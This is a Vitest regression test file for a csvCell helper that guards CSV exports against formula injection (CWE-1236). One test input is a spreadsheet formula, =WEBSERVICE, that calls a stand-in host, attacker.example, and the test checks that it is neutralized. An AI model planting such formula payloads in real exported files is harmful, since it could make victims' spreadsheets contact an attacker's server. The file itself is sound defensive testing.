import { describe, expect, it } from "vitest";
import { csvCell } from "./csv-cell";

// Task #2.21 security audit — CSV/formula injection (CWE-1236) regression
// tests. A cell that starts with =, +, -, or @ can be interpreted as a
// formula by Excel/Google Sheets once the exported file is opened.
describe("csvCell", () => {
  it("quotes an ordinary value with no special handling", () => {
    expect(csvCell("Le Petit Café")).toBe('"Le Petit Café"');
  });

  it("escapes embedded double quotes", () => {
    expect(csvCell('Say "hello"')).toBe('"Say ""hello"""');
  });

  it("neutralizes a leading = (formula trigger)", () => {
    expect(csvCell("=WEBSERVICE(\"https://attacker.example\")")).toBe(
      '"\'=WEBSERVICE(""https://attacker.example"")"'
    );
  });

  it("neutralizes a leading +", () => {
    expect(csvCell("+1+1")).toBe('"\'+1+1"');
  });

  it("neutralizes a leading -", () => {
    expect(csvCell("-2+3")).toBe('"\'-2+3"');
  });

  it("neutralizes a leading @", () => {
    expect(csvCell("@SUM(A1:A9)")).toBe('"\'@SUM(A1:A9)"');
  });

  it("does not touch a formula-trigger character that isn't the first character", () => {
    expect(csvCell("Table = 5")).toBe('"Table = 5"');
  });

  it("treats null/undefined as an empty cell", () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });

  it("stringifies non-string values before checking for a formula trigger", () => {
    expect(csvCell(42)).toBe('"42"');
    expect(csvCell(true)).toBe('"true"');
  });
});
